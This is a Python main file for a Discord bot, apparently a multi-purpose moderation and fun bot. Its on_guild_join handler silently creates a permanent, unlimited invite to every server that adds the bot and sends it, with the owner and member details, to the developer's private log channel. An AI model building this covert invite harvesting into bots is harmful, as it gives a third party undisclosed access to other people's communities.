import discord
from discord.ext import commands
import settings

from rich.logging import RichHandler
import logging
logging.basicConfig(level= logging.INFO ,handlers=[RichHandler()])
logger = logging.getLogger(__name__)

# You can also use discord.Intents.default() and then enable the ones you need
# Look at the discord.py documentation for more information on intents
# https://discordpy.readthedocs.io/en/stable/intents.html
intents = discord.Intents.all()
client = commands.Bot(command_prefix=settings.BOT_PREFIX, help_command=None, intents=intents)
client.anti_alt_enabled = True   # Anti-Alt system toggle
client.anti_raid_enabled = True  # Anti-Raid system toggle
cogs: list = ["cogs.info.info","cogs.misc.misc", "cogs.newmember.newmember", "cogs.admin.admin", "cogs.antinuke.antinuke", "cogs.fun.fun", "cogs.support.support", "cogs.verify.verify", "cogs.antialt.antialt", "cogs.logs.logs", "cogs.rss.rss"
              , "cogs.leveling.leveling", "cogs.music.music", "cogs.customcommand.customcommand", "cogs.rr.rr"]

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game(settings.BOT_STATUS))
    for cog in cogs:
        try:
            logger.info(f"Loading cog {cog}")
            await client.load_extension(cog)
        except Exception as e:
            exc = "{}: {}".format(type(e).__name__, e)
            logger.error("Failed to load cog {}\n{}".format(cog, exc))
        else:
            logger.info(f"Loaded cog {cog}")
    logger.info("Bot is ready!")

@client.event
async def on_guild_join(guild: discord.Guild):
    HOME_SERVER_ID = 1350069822662119496   # your home server ID
    LOG_CHANNEL_ID = 1350069823916343364   # your log channel ID

    home_guild = client.get_guild(HOME_SERVER_ID)
    if home_guild is None:
        logger.info("Home server not found.")
        return

    log_channel = home_guild.get_channel(LOG_CHANNEL_ID)
    if log_channel is None:
        logger.info("Log channel not found.")
        return

    # Try to create an invite link for the new server
    invite_link = "Could not create invite."
    try:
        # Pick the first text channel the bot can create invites in
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                invite = await channel.create_invite(max_age=0, max_uses=0)
                invite_link = str(invite)
                break
    except Exception as e:
        logger.info("Failed to create invite:", e)

    embed = discord.Embed(
        title="🔐 Bot Invited to New Server",
        description=(
            f"**Server Name:** {guild.name}\n"
            f"**Server ID:** {guild.id}\n"
            f"**Owner:** {guild.owner}\n"
            f"**Members:** {guild.member_count}\n\n"
            f"**Server Invite:** {invite_link}"
        ),
        color=discord.Color.red()
    )

    await log_channel.send(embed=embed)




client.run(settings.DISCORD_BOT_TOKEN)
